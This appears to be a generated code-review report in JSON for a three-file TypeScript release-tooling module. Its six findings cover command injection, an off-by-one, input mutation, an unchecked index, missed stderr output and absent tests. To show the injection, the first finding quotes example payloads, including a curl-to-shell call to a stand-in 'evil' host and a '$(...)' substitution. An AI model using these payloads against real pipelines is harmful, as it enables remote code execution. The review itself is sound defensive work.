@@ -1,0 +1,63 @@
+{
+  "schema_version": 1,
+  "kind": "normalized-review",
+  "target_sha256": "25f03027edd1083ac0b4d29c4c9a4a8137e268497173c8ef98a8681253b86ec4",
+  "findings": [
+    {
+      "id": "CR-001",
+      "severity": "critical",
+      "category": "command-injection",
+      "file": "src/publish.ts",
+      "line": 5,
+      "title": "execSync interpolates untrusted tag and remote into a shell command",
+      "rationale": "execSync executes its argument via /bin/sh -c, and both parameters are interpolated directly into that string. `remote` is completely unquoted: publishTag(\"v1.0.0\", \"origin; curl http://evil/x.sh | sh\") runs the attacker's pipeline with the privileges of the release process. `tag` sits inside double quotes, but double quotes do not suppress command substitution, so tag = 'v1$(id > /tmp/pwn)' or a backtick payload executes as well. Any release pipeline that derives tag or remote from a branch name, PR title, workflow input, or webhook payload is remotely exploitable. Smallest fix: bypass the shell with execFileSync(\"git\", [\"push\", remote, `refs/tags/${tag}`], { encoding: \"utf-8\" }). Argument-array form alone is not sufficient -- a remote of `--receive-pack=<cmd>` is still argument injection that makes git execute a command -- so additionally reject values beginning with '-' and validate tag against /^[A-Za-z0-9._\\/-]+$/."
+    },
+    {
+      "id": "CR-002",
+      "severity": "high",
+      "category": "off-by-one",
+      "file": "src/changelog.ts",
+      "line": 4,
+      "title": "Loop condition `i <= count` returns count + 1 entries",
+      "rationale": "The loop runs from i = 0 through i = count inclusive, producing count + 1 elements rather than the count promised by the doc comment. firstEntries([\"a\",\"b\",\"c\"], 2) returns [\"a\",\"b\",\"c\"] instead of [\"a\",\"b\"]. In release tooling this silently leaks one extra changelog entry into every published note -- typically the previous release's top line, and potentially an unreleased or embargoed entry. Fix: change the condition to `i < count`."
+    },
+    {
+      "id": "CR-003",
+      "severity": "high",
+      "category": "input-mutation",
+      "file": "src/notes.ts",
+      "line": 8,
+      "title": "withFooter mutates the caller's note instead of returning a copy",
+      "rationale": "The doc comment states \"Return a copy of the note with the footer appended\", but the body calls note.highlights.push(footer) and returns the same object reference, so the returned value is === the input. Two consequences: (1) the caller's original note is corrupted -- any other holder of that object now sees the footer; (2) calls do not compose, so withFooter(withFooter(n, \"a\"), \"b\") leaves n.highlights with both footers appended, and re-rendering the same note in a loop accumulates a footer per iteration. Fix: return { ...note, highlights: [...note.highlights, footer] }."
+    },
+    {
+      "id": "CR-004",
+      "severity": "medium",
+      "category": "unchecked-array-access",
+      "file": "src/changelog.ts",
+      "line": 5,
+      "title": "Unbounded index pushes undefined into a declared string[]",
+      "rationale": "lines[i] is never bounds-checked against lines.length. When count exceeds the number of available lines -- an entirely normal case for a first release or a short changelog -- the out-of-range reads yield undefined, which is pushed into an array declared as string[]. The type annotation makes this invisible to the compiler, so the corruption surfaces downstream as a TypeError on .trim()/.toUpperCase(), or as the literal text \"undefined\" rendered into published release notes. This defect is independent of CR-002 and survives its fix: with `i < count`, firstEntries([\"a\"], 5) still returns [\"a\", undefined, undefined, undefined, undefined]. Fix: clamp the bound, e.g. const n = Math.max(0, Math.min(count, lines.length)), and loop to n."
+    },
+    {
+      "id": "CR-005",
+      "severity": "medium",
+      "category": "wrong-stream-capture",
+      "file": "src/publish.ts",
+      "line": 6,
+      "title": "Return value is always empty because git push writes to stderr",
+      "rationale": "git push writes its human-readable status -- \"To github.com:org/repo.git\", \"* [new tag] v1.0.0 -> v1.0.0\", \"Everything up-to-date\" -- to stderr, not stdout; stdout is empty for an ordinary push. execSync returns only the child's stdout, and its default stdio forwards the child's stderr to the parent process rather than capturing it. The function therefore returns \"\" on every successful push, contradicting the documented \"server response\", and any caller that logs, parses, or asserts on that string silently gets nothing. Related: on a failed push execSync throws, so the diagnostics never reach the return path either. Fix: pass { encoding: \"utf-8\", stdio: [\"ignore\", \"pipe\", \"pipe\"] } and return the captured stderr (or both streams), or correct the doc comment to say stdout only."
+    },
+    {
+      "id": "CR-006",
+      "severity": "medium",
+      "category": "missing-test-coverage",
+      "file": null,
+      "line": null,
+      "title": "Module ships no tests; no test run could be observed",
+      "rationale": "The workspace contains only src/publish.ts, src/changelog.ts, and src/notes.ts -- there is no test file, harness, or runner anywhere in the module, so no test execution could be observed and every defect above is unguarded. Each of the three confirmed bugs would be caught by one obvious test, which is evidence the gap is load-bearing rather than cosmetic. Exact missing tests: (1) firstEntries at the boundary -- assert firstEntries([\"a\",\"b\",\"c\"], 2) has length 2, which pins CR-002, and firstEntries([\"a\"], 3) contains no undefined, which pins CR-004; (2) withFooter purity -- assert result !== note and note.highlights.length is unchanged after the call, which pins CR-003; (3) publishTag argument handling -- assert that remote/tag values containing ';', '$(', backticks, or a leading '-' are rejected rather than executed, which pins CR-001 and CR-005's fix shape. Until these exist the module cannot be approved."
+    }
+  ],
+  "summary": "Three-file release-tooling module (~25 lines), and each file carries a distinct defect. The blocking issue is a shell command injection in publishTag: execSync interpolates both `remote` (entirely unquoted) and `tag` (inside double quotes, which still expand `$(...)` and backticks) into a string executed by /bin/sh -c, so either parameter yields arbitrary code execution on the release machine. firstEntries has a classic `i <= count` off-by-one that returns count+1 entries, plus an independent unguarded index that emits `undefined` into a declared string[] when count exceeds the input length. withFooter documents itself as returning a copy but mutates the caller's highlights array in place and returns the same object reference, so repeated calls accumulate footers on the caller's original note. A secondary correctness bug in publishTag: git push reports to stderr, and execSync's default stdio does not capture stderr, so the documented \"server response\" is always the empty string. The module ships no tests at all -- the workspace contains only the three source files -- so no test run could be observed and none of the three behaviours is pinned; I cannot approve on that basis. Tests and code do not disagree here because there are no tests to disagree: every doc comment (`first count entries`, `a copy of the note`, `the server response`) is contradicted by its implementation, with nothing in the repo to catch it.",
+  "verdict": "request-changes"
+}
